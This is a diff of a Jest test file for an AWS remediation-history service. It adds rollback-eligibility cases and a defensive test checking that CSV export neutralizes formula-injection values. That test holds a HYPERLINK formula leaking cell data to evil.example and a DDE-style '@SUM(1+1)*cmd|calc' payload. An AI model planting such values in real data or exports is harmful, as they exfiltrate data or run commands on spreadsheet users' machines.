@@ -5,7 +5,8 @@ import { Logger } from '@aws-lambda-powertools/logger';
 import { DynamoDBDocumentClient, PutCommand } from '@aws-sdk/lib-dynamodb';
 import { RemediationService } from '../../services/remediationService';
 import { AuthenticatedUser } from '../../services/authorization';
-import { RemediationsRequest } from '@asr/data-models';
+import { RemediationsRequest, narrowRollbackEligibilityToNewestPerFinding } from '@asr/data-models';
+import { calculateTtlTimestamp } from '../../../common/utils/ttlUtils';
 import { DynamoDBTestSetup } from '../../../common/__tests__/dynamodbSetup';
 import { findingsTableName } from '../../../common/__tests__/envSetup';
 import {
@@ -124,6 +125,7 @@ describe('RemediationService', () => {
             consoleLink:
               'https://us-east-1.console.aws.amazon.com/states/home?region=us-east-1#/v2/executions/details/arn%3Aaws%3Astates%3Aus-east-1%3A123456789012%3Aexecution%3ATestStateMachine%3Aexec-123',
             isRollbackEligible: false,
+            reRemediationEligibleAt: calculateTtlTimestamp('2023-01-01T00:00:00Z'),
           },
         ],
         NextToken: undefined,
@@ -424,6 +426,7 @@ describe('RemediationService', () => {
         consoleLink:
           'https://us-east-1.console.aws.amazon.com/states/home?region=us-east-1#/v2/executions/details/arn%3Aaws%3Astates%3Aus-east-1%3A123456789012%3Aexecution%3ATestStateMachine%3Aexec-123',
         isRollbackEligible: false,
+        reRemediationEligibleAt: calculateTtlTimestamp('2023-01-01T00:00:00Z'),
       });
 
       expect(result.Remediations[0]).not.toHaveProperty('findingId#executionId');
@@ -451,6 +454,7 @@ describe('RemediationService', () => {
         'lastUpdatedTime#findingId': '2023-01-01T00:00:00Z#finding-guardduty-1',
         REMEDIATION_CONSTANT: 'remediation' as const,
         expireAt: 9999999999,
+        rollbackAvailable: true,
         findingJSON: new Uint8Array([1, 2, 3]),
       };
 
@@ -481,6 +485,7 @@ describe('RemediationService', () => {
         'lastUpdatedTime#findingId': '2023-01-01T00:00:00Z#finding-guardduty-retry',
         REMEDIATION_CONSTANT: 'remediation' as const,
         expireAt: 9999999999,
+        rollbackAvailable: true,
         findingJSON: new Uint8Array([1, 2, 3]),
       };
 
@@ -491,6 +496,65 @@ describe('RemediationService', () => {
       const item = result.Remediations.find((r) => r.findingId === 'finding-guardduty-retry');
 
       expect(item?.isRollbackEligible).toBe(true);
+    });
+
+    it('returns isRollbackEligible: true for a snapshot-based ROLLBACK_FAILED entry with no rollbackBackupKey', async () => {
+      const mockItem = {
+        findingType: 'security-control/S3.6',
+        findingId: 'finding-s3-6-retry',
+        remediationStatus: 'ROLLBACK_FAILED',
+        lastUpdatedTime: '2023-01-01T00:00:00Z',
+        lastUpdatedBy: 'test-user@example.com',
+        accountId: '123456789012',
+        resourceId: 'arn:aws:s3:::my-bucket',
+        resourceType: 'AwsS3Bucket',
+        resourceTypeNormalized: 'S3 Bucket',
+        severity: 'HIGH',
+        region: 'us-east-1',
+        executionId: 'arn:aws:states:us-east-1:123456789012:execution:SM:exec-s3-retry',
+        'findingId#executionId': 'finding-s3-6-retry#exec-s3-retry',
+        'lastUpdatedTime#findingId': '2023-01-01T00:00:00Z#finding-s3-6-retry',
+        REMEDIATION_CONSTANT: 'remediation' as const,
+        expireAt: 9999999999,
+        rollbackAvailable: true,
+        snapshotVersionId: 'snapshot-version-1',
+      };
+
+      await dynamoDBDocumentClient.send(new PutCommand({ TableName: remediationHistoryTableName, Item: mockItem }));
+
+      const request: RemediationsRequest = { Filters: { StringFilters: [] } };
+      const result = await remediationService.searchRemediations(mockAuthenticatedUser, request);
+
+      expect(result.Remediations.find((r) => r.findingId === 'finding-s3-6-retry')?.isRollbackEligible).toBe(true);
+    });
+
+    it('returns isRollbackEligible: false for the same snapshot entry when rollbackAvailable is absent', async () => {
+      const mockItem = {
+        findingType: 'security-control/S3.6',
+        findingId: 'finding-s3-6-no-flag',
+        remediationStatus: 'ROLLBACK_FAILED',
+        lastUpdatedTime: '2023-01-01T00:00:00Z',
+        lastUpdatedBy: 'test-user@example.com',
+        accountId: '123456789012',
+        resourceId: 'arn:aws:s3:::my-bucket',
+        resourceType: 'AwsS3Bucket',
+        resourceTypeNormalized: 'S3 Bucket',
+        severity: 'HIGH',
+        region: 'us-east-1',
+        executionId: 'arn:aws:states:us-east-1:123456789012:execution:SM:exec-s3-no-flag',
+        'findingId#executionId': 'finding-s3-6-no-flag#exec-s3-no-flag',
+        'lastUpdatedTime#findingId': '2023-01-01T00:00:00Z#finding-s3-6-no-flag',
+        REMEDIATION_CONSTANT: 'remediation' as const,
+        expireAt: 9999999999,
+        snapshotVersionId: 'snapshot-version-1',
+      };
+
+      await dynamoDBDocumentClient.send(new PutCommand({ TableName: remediationHistoryTableName, Item: mockItem }));
+
+      const request: RemediationsRequest = { Filters: { StringFilters: [] } };
+      const result = await remediationService.searchRemediations(mockAuthenticatedUser, request);
+
+      expect(result.Remediations.find((r) => r.findingId === 'finding-s3-6-no-flag')?.isRollbackEligible).toBe(false);
     });
 
     it('returns isRollbackEligible: false for a FAILED remediation (no rollback on failed executions)', async () => {
@@ -589,6 +653,7 @@ describe('RemediationService', () => {
         REMEDIATION_CONSTANT: 'remediation' as const,
         expireAt: 9999999999,
         findingJSON: new Uint8Array([1, 2, 3]),
+        rollbackAvailable: true,
       };
 
       const olderItem = {
@@ -737,6 +802,56 @@ describe('RemediationService', () => {
       expect(lines[1]).toContain('Test error message');
     });
 
+    it('neutralizes CSV formula-injection payloads in finding-derived fields', async () => {
+      const remediationItem = {
+        findingType: 'security-control/Lambda.3',
+        findingId: 'arn:aws:securityhub:us-east-1:123456789012:security-control/Lambda.3/finding/csvinj',
+        'findingId#executionId':
+          'arn:aws:securityhub:us-east-1:123456789012:security-control/Lambda.3/finding/csvinj#arn:aws:states:us-east-1:123456789012:execution:TestStateMachine:exec-csvinj',
+        accountId: '123456789012',
+        resourceId: '=HYPERLINK("http://evil.example/?leak="&A1,"click")',
+        resourceType: 'AWS::Lambda::Function',
+        resourceTypeNormalized: 'awslambdafunction',
+        severity: 'HIGH',
+        region: 'us-east-1',
+        remediationStatus: 'FAILED',
+        lastUpdatedTime: '2023-01-01T00:00:00Z',
+        'lastUpdatedTime#findingId':
+          '2023-01-01T00:00:00Z#arn:aws:securityhub:us-east-1:123456789012:security-control/Lambda.3/finding/csvinj',
+        REMEDIATION_CONSTANT: 'remediation',
+        lastUpdatedBy: 'test-user@example.com',
+        executionId: 'arn:aws:states:us-east-1:123456789012:execution:TestStateMachine:exec-csvinj',
+        expireAt: Math.floor(Date.now() / 1000) + 90 * 24 * 60 * 60,
+        error: '@SUM(1+1)*cmd|calc',
+      };
+
+      await dynamoDBDocumentClient.send(
+        new PutCommand({
+          TableName: remediationHistoryTableName,
+          Item: remediationItem,
+        }),
+      );
+
+      const exportRequest = {
+        SortCriteria: [
+          {
+            Field: 'lastUpdatedTime',
+            SortOrder: 'desc' as const,
+          },
+        ],
+      };
+
+      await remediationService.exportRemediationHistory(mockAuthenticatedUser, exportRequest);
+
+      const uploadCall = jest.mocked(remediationService['s3Client'].uploadCsvAndGeneratePresignedUrl).mock.calls[0];
+      const csvContent = uploadCall[2];
+
+      expect(csvContent).toContain(`"'=HYPERLINK`);
+      expect(csvContent).toContain(`'@SUM(1+1)*cmd|calc`);
+      expect(csvContent).not.toContain(',=HYPERLINK');
+      expect(csvContent).not.toContain(',@SUM(1+1)*cmd|calc');
+    });
+
     it('should generate CSV with headers only when no data exists', async () => {
       const exportRequest = {
         SortCriteria: [
@@ -813,5 +928,45 @@ describe('RemediationService', () => {
       expect(result.totalExported).toBe(50000);
       expect(result.message).toBe('Maximum export size reached. Apply filters to reduce dataset.');
     });
+  });
+});
+
+describe('narrowRollbackEligibilityToNewestPerFinding', () => {
+  // Rows shaped like the REST response, where executionId is optional.
+  const row = (findingId: string, lastUpdatedTime: string, executionId?: string) => ({
+    findingId,
+    lastUpdatedTime,
+    ...(executionId !== undefined && { executionId }),
+    isRollbackEligible: true,
+  });
+
+  it('keeps exactly one of two eligible rows that tie for newest, by greatest executionId', () => {
+    const rows = [row('f', '2026-01-01T00:00:00Z', 'exec-a'), row('f', '2026-01-01T00:00:00Z', 'exec-b')];
+
+    const narrowed = narrowRollbackEligibilityToNewestPerFinding(rows);
+
+    expect(narrowed.map((r) => r.isRollbackEligible)).toEqual([false, true]);
+  });
+
+  it('keeps exactly one row when the tied rows have no executionId at all', () => {
+    // Identity, not the executionId value, decides: two ids that both compare as empty must
+    // not both survive.
+    const rows = [row('f', '2026-01-01T00:00:00Z'), row('f', '2026-01-01T00:00:00Z')];
+
+    const narrowed = narrowRollbackEligibilityToNewestPerFinding(rows);
+
+    expect(narrowed.filter((r) => r.isRollbackEligible)).toHaveLength(1);
+  });
+
+  it('narrows each finding independently within one page', () => {
+    const rows = [
+      row('f1', '2026-01-02T00:00:00Z', 'x1'),
+      row('f1', '2026-01-01T00:00:00Z', 'x0'),
+      row('f2', '2026-01-01T00:00:00Z', 'y0'),
+    ];
+
+    const narrowed = narrowRollbackEligibilityToNewestPerFinding(rows);
+
+    expect(narrowed.map((r) => r.isRollbackEligible)).toEqual([true, false, true]);
   });
 });
